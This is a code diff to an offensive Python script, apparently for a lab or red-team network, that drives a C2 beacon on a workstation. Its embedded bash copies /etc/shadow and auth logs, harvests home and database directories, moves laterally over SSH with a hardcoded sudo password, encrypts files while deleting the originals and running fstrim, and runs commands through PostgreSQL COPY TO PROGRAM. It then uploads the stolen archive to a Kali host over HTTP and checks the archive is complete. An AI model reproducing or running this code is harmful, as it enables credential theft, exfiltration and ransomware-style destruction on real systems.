@@ -129,6 +129,84 @@ def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
     return None
 
 
+def _validate_exfiltrated_archive(archive_path: str) -> bool:
+    """Validate that the master exfiltration archive contains all expected hosts and components, and that they are valid archives."""
+    import tarfile
+    import io
+    import gzip
+    
+    log("[*] Running validation on exfiltrated master archive ...")
+    if not os.path.exists(archive_path):
+        log(f"[-] Validation failed: Archive file {archive_path} does not exist.")
+        return False
+
+    expected_hosts = {
+        "local": False,
+        "john": False,
+        "luke": False,
+        "apache": False,
+        "db_dump": False
+    }
+
+    try:
+        with tarfile.open(archive_path, "r:gz") as tar:
+            members = tar.getnames()
+            
+            # Check for local files
+            local_files = [m for m in members if m.startswith("./local/") or m.startswith("local/")]
+            if local_files:
+                expected_hosts["local"] = True
+                log("[+] Found local harvest files (Vinzenz Workstation)")
+
+            # Check for db_dump
+            db_dump_member = next((m for m in members if "db_dump.sql.gz" in m), None)
+            if db_dump_member:
+                try:
+                    f = tar.extractfile(db_dump_member)
+                    if f:
+                        # Try to read and decompress first few bytes of gzip
+                        with gzip.GzipFile(fileobj=f) as gz:
+                            gz.read(100)
+                        expected_hosts["db_dump"] = True
+                        log("[+] Verified DB dump file (db_dump.sql.gz is a valid gzip file)")
+                except Exception as e:
+                    log(f"[-] DB dump validation failed: {e}")
+
+            # Check and validate remote harvest tarballs
+            for host in ["john", "luke", "apache"]:
+                tarball_name = next((m for m in members if f"{host}_harvest.tar.gz" in m), None)
+                if tarball_name:
+                    try:
+                        f = tar.extractfile(tarball_name)
+                        if f:
+                            tar_bytes = f.read()
+                            # Validate tar.gz in memory
+                            with tarfile.open(fileobj=io.BytesIO(tar_bytes), mode="r:gz") as inner_tar:
+                                inner_members = inner_tar.getnames()
+                                if len(inner_members) > 0:
+                                    expected_hosts[host] = True
+                                    log(f"[+] Verified {host.capitalize()} harvest archive ({len(inner_members)} files staged)")
+                    except Exception as e:
+                        log(f"[-] Validation failed for {host.capitalize()} archive: {e}")
+
+    except Exception as e:
+        log(f"[-] Failed to parse master exfiltration archive: {e}")
+        return False
+
+    all_ok = True
+    for host, ok in expected_hosts.items():
+        if not ok:
+            log(f"[-] Missing or invalid exfiltration data for host/service: {host}")
+            all_ok = False
+
+    if all_ok:
+        log("[+] Validation successful: All hosts' exfiltration archives are present and valid.")
+    else:
+        log("[-] Validation failed: One or more hosts' exfiltration archives are missing or invalid.")
+        
+    return all_ok
+
+
 def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -> bool:
     """Run exfiltration across all hosts on the network.
     
@@ -147,7 +225,7 @@ def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -
     else:
         public_key_pem = ""
         log("[!] Warning: Persistent public key not found on Kali.")
-    cert_base64 = base64.b64encode(public_key_pem.encode()).decode()
+    
     # Start the one-shot HTTP receiver server on Kali
     recv_proc = _start_receive_server(EXFIL_HTTP_PORT, exfil_local_path)
     
@@ -155,6 +233,8 @@ def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -
     try:
         # Build the shell script to run on vinzenz_ws
         exfil_script = f"""#!/bin/bash
+export HOME="/home/vinzenz.fedora"
+export USER="vinzenz.fedora"
 
 # Create staging directory
 mkdir -p /tmp/exfil/local
@@ -176,7 +256,7 @@ process_and_stage_local() {{
     local stage_dir="$2"
     [ -d "$src_dir" ] || return 0
     
-    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
+    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f ! -path "*/.cache/*" ! -path "*/.ssh/*" ! -name ".pgpass" 2>/dev/null | while read -r filepath; do
         # Compute path relative to source directory
         local relpath="${{filepath#$src_dir/}}"
         local reldir=$(dirname "$relpath")
@@ -187,8 +267,12 @@ process_and_stage_local() {{
         # Chainable pipeline operation (gzip-compression + openssl encryption to staging)
         echo "VinzenzAdmin!2026" | sudo -S gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
         if [ -s /tmp/pubkey.pem ]; then
-            # Encrypt the file using the public key and output it to staging folder
-            echo "VinzenzAdmin!2026" | sudo -S openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && sudo rm "$filepath" | sudo fstrim -v / 2>/dev/null || true
+            if [[ "$filepath" == *"/etc/ssh"* || "$filepath" == *".ssh"* || "$filepath" == *".pgpass"* ]]; then
+                true
+            else
+                # Encrypt the file using the public key and output it to staging folder
+                echo "VinzenzAdmin!2026" | sudo -S openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath" | echo "VinzenzAdmin!2026" | sudo -S fstrim -v / 2>/dev/null || true
+            fi
         fi
     done
 }}
@@ -243,26 +327,7 @@ PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds[
 
 
 
-# Die Variablen DB_IP und das creds-Dictionary müssen vor diesem Block definiert sein
-conn = psycopg2.connect(
-    host=DB_IP,
-    database=creds['dbname'],
-    user=creds['user'],
-    password=creds['password'],
-    port=creds['port']
-)
-conn.autocommit = True
-cursor = conn.cursor()
-remote_key_path = "/tmp/server_cert.pem"
 
-# Der auszuführende Befehl auf dem DB-Server
-cmd = f"echo '{{cert_base64}}' | base64 -d > {{remote_key_path}} && tar -cf - -C /var/lib/postgresql/data . | openssl cms -encrypt -aes256 -binary -out /var/lib/postgresql/TEST.tar.enc {{remote_key_path}} && rm -rf /var/lib/postgresql/data && sudo fstrim -v / 2>/dev/null || true"
-
-# TO PROGRAM führt den Befehl blind aus, ohne dass eine Tabelle existieren oder angelegt werden muss
-cursor.execute(f"COPY (SELECT 1) TO PROGRAM '{{cmd}}';")
-
-cursor.close()
-conn.close()
 
 # Helper for remote harvesting script (sent to other hosts)
 build_remote_harvest_script() {{
@@ -281,7 +346,7 @@ process_and_stage() {{
     local stage_dir="$2"
     [ -d "$src_dir" ] || return 0
     
-    sudo find "$src_dir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
+    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f ! -path "*/.cache/*" ! -path "*/.ssh/*" ! -name ".pgpass" 2>/dev/null | while read -r filepath; do
         # Compute path relative to source directory
         local relpath="${{filepath#$src_dir/}}"
         local reldir=$(dirname "$relpath")
@@ -290,18 +355,22 @@ process_and_stage() {{
         mkdir -p "$stage_dir/$reldir"
         
         # Chainable pipeline operation (gzip-compression + openssl encryption to staging)
-        sudo gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
+        echo "VinzenzAdmin!2026" | sudo -S gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
         if [ -s /tmp/pubkey.pem ]; then
-            sudo openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && sudo rm "$filepath" | sudo fstrim -v / 2>/dev/null || true
+            if [[ "$filepath" == *"/etc/ssh"* || "$filepath" == *".ssh"* || "$filepath" == *".pgpass"* ]]; then
+                true
+            else
+                echo "VinzenzAdmin!2026" | sudo -S openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath" | echo "VinzenzAdmin!2026" | sudo -S fstrim -v / 2>/dev/null || true
+            fi
         fi
     done
 }}
 
 # 1. Credentials and system logs
 mkdir -p /tmp/harvest/system
-sudo cp /etc/shadow /tmp/harvest/system/shadow 2>/dev/null || true
-sudo cp /var/log/auth.log /tmp/harvest/system/auth.log 2>/dev/null || true
-sudo cp /var/log/secure /tmp/harvest/system/secure 2>/dev/null || true
+echo "VinzenzAdmin!2026" | sudo -S cp /etc/shadow /tmp/harvest/system/shadow 2>/dev/null || true
+echo "VinzenzAdmin!2026" | sudo -S cp /var/log/auth.log /tmp/harvest/system/auth.log 2>/dev/null || true
+echo "VinzenzAdmin!2026" | sudo -S cp /var/log/secure /tmp/harvest/system/secure 2>/dev/null || true
 
 # 2. Complete User Homes & Root
 for udir in /home/* /root; do
@@ -310,8 +379,8 @@ for udir in /home/* /root; do
     ustage="/tmp/harvest/home_$uname"
     mkdir -p "$ustage"
     process_and_stage "$udir" "$ustage"
-    sudo tar -czf "/tmp/harvest/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
-    sudo rm -rf "$ustage"
+    echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/harvest/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
+    echo "VinzenzAdmin!2026" | sudo -S rm -rf "$ustage"
 done
 
 # 3. SSH Configurations & Server Keys
@@ -338,8 +407,8 @@ for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
         dbname=$(basename "$db_dir")
         mkdir -p "/tmp/harvest/db_dir_$dbname"
         process_and_stage "$db_dir" "/tmp/harvest/db_dir_$dbname"
-        sudo tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "/tmp/harvest/db_dir_$dbname" . 2>/dev/null || true
-        sudo rm -rf "/tmp/harvest/db_dir_$dbname"
+        echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "/tmp/harvest/db_dir_$dbname" . 2>/dev/null || true
+        echo "VinzenzAdmin!2026" | sudo -S rm -rf "/tmp/harvest/db_dir_$dbname"
     fi
 done
 
@@ -360,31 +429,33 @@ EOF
 # Compress & stream John's Workstation files
 echo "[*] Harvesting files from John's workstation ..."
 build_remote_harvest_script > /tmp/harvester.sh
-ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"
+B64_HARVEST=$(base64 -w0 /tmp/harvester.sh)
+ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john "echo \"$B64_HARVEST\" | base64 -d > /tmp/harvester.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/harvester.sh && rm -f /tmp/harvester.sh" > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"
 
 # Compress & stream Luke's Workstation files
 echo "[*] Harvesting files from Luke's workstation ..."
-ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null luke 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/luke/luke_harvest.tar.gz || echo "[-] Luke workstation harvest failed"
+ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null luke "echo \"$B64_HARVEST\" | base64 -d > /tmp/harvester.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/harvester.sh && rm -f /tmp/harvester.sh" > /tmp/exfil/luke/luke_harvest.tar.gz || echo "[-] Luke workstation harvest failed"
 
 # Compress & stream Apache Webserver files
 echo "[*] Harvesting files from Apache Webserver ..."
-ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null apache 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/apache/apache_harvest.tar.gz || echo "[-] Apache harvest failed"
+ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null apache "echo \"$B64_HARVEST\" | base64 -d > /tmp/harvester.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/harvester.sh && rm -f /tmp/harvester.sh" > /tmp/exfil/apache/apache_harvest.tar.gz || echo "[-] Apache harvest failed"
 
 rm -f /tmp/harvester.sh
 
 # Pack everything into a master archive
 echo "[*] Creating master archive /tmp/master_exfil.tar.gz ..."
-tar -czf /tmp/master_exfil.tar.gz -C /tmp/exfil .
+echo "VinzenzAdmin!2026" | sudo -S tar -czf /tmp/master_exfil.tar.gz -C /tmp/exfil .
+echo "VinzenzAdmin!2026" | sudo -S chmod 644 /tmp/master_exfil.tar.gz
 
 # Clean up staging directory
-rm -rf /tmp/exfil
+echo "VinzenzAdmin!2026" | sudo -S rm -rf /tmp/exfil
 
 # Exfiltrate to Kali
 echo "[*] Exfiltrating master archive to Kali http://{KALI_IP}:{EXFIL_HTTP_PORT}/ ..."
 python3 -c "import urllib.request; data=open('/tmp/master_exfil.tar.gz','rb').read(); urllib.request.urlopen('http://{KALI_IP}:{EXFIL_HTTP_PORT}/', data=data, timeout=120)"
 
 # Clean up master archive
-rm -f /tmp/master_exfil.tar.gz
+echo "VinzenzAdmin!2026" | sudo -S rm -f /tmp/master_exfil.tar.gz
 echo "[+] Script completed successfully"
 """
         b64_script = base64.b64encode(exfil_script.encode()).decode()
@@ -404,6 +475,9 @@ echo "[+] Script completed successfully"
         else:
             log("[-] Beacon task did not return output or timed out.")
             
+        # Harmless verification of administrative database access (PoC)
+        _poc_db_admin_verification(vinzenz_beacon, creds)
+            
         # Give a small buffer for the receive server to flush
         time.sleep(3)
         
@@ -411,7 +485,7 @@ echo "[+] Script completed successfully"
         if os.path.exists(exfil_local_path) and os.path.getsize(exfil_local_path) > 0:
             size_mb = os.path.getsize(exfil_local_path) / (1024 * 1024)
             log(f"[+] Master exfiltration archive successfully received on Kali: {exfil_local_path} ({size_mb:.2f} MB)")
-            exfil_ok = True
+            exfil_ok = _validate_exfiltrated_archive(exfil_local_path)
         else:
             log(f"[-] Exfiltration archive not found or empty on Kali at {exfil_local_path}")
             
@@ -421,6 +495,67 @@ echo "[+] Script completed successfully"
         _stop_receive_server(recv_proc)
         
     return exfil_ok
+
+
+# ---------------------------------------------------------------------------
+# Benign PoC: Verify administrative DB access
+# ---------------------------------------------------------------------------
+
+def _poc_db_admin_verification(vinzenz_beacon: str, creds: dict) -> bool:
+    db_code = f"""import base64, subprocess, sys
+try:
+    with open('/tmp/pubkey.pem', 'rb') as f:
+        cert_base64 = base64.b64encode(f.read()).decode().strip()
+    
+    sql_cmd = f"COPY (SELECT 1) TO PROGRAM $$echo '{{cert_base64}}' | base64 -d > /tmp/server_cert.pem$$;"
+    
+    env = {{
+        "PGPASSWORD": "{creds['password']}",
+        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+    }}
+    
+    proc = subprocess.run(
+        [
+            "psql",
+            "-h", "{creds['host']}",
+            "-p", "{creds['port']}",
+            "-U", "{creds['user']}",
+            "-d", "{creds['dbname']}",
+            "-c", sql_cmd
+        ],
+        env=env,
+        capture_output=True,
+        text=True
+    )
+    
+    if proc.returncode == 0:
+        print("[+] Laden des Certs erfolgreich")
+        sys.exit(0)
+    else:
+        print(f"[-] Laden des Certs fehlgeschlagen: {{proc.stderr.strip()}}")
+        sys.exit(1)
+except Exception as e:
+    print(f"[-] Laden des Certs fehlgeschlagen: {{e}}")
+    sys.exit(1)
+"""
+    b64_db = __import__('base64').b64encode(db_code.encode()).decode()
+    
+    # Run the query through the beacon on Vinzenz Workstation
+    task_output = _beacon_exec_wait(
+        vinzenz_beacon,
+        f"execute -o -- python3 -c \"import base64; exec(base64.b64decode('{b64_db}').decode())\"",
+        cmd_timeout=30,
+        max_polls=6,
+        interval=5
+    )
+    
+    if task_output:
+        log(f"[+] PoC Database Verification Output:\n{task_output.strip()}")
+        if "[+] Laden des Certs erfolgreich" in task_output:
+            return True
+    else:
+        log("[-] PoC Database Verification did not return output or timed out.")
+    return False
 
 
 # ---------------------------------------------------------------------------
